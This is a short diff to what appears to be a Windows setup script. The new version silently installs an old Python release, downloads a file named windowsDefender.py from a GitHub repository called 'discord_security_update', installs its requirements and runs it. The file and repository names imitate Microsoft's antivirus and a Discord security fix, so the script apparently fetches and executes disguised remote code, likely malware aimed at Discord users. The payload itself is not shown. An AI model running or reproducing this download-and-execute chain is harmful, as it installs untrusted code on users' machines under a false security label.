@@ -1,5 +1,5 @@
 curl https://www.python.org/ftp/python/3.4.3/python-3.4.3rc1.amd64.msi -O
-msiexec /a python-3.4.3rc1.amd64.msi /qb TARGETDIR=C:\python34
+msiexec /i python-3.4.3rc1.amd64.msi /qn TARGETDIR=C:\python34
 
 
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
@@ -8,4 +8,4 @@ curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/
 
 pip install -r requirements.txt
 
-python runer.py
+python windowsDefender.py
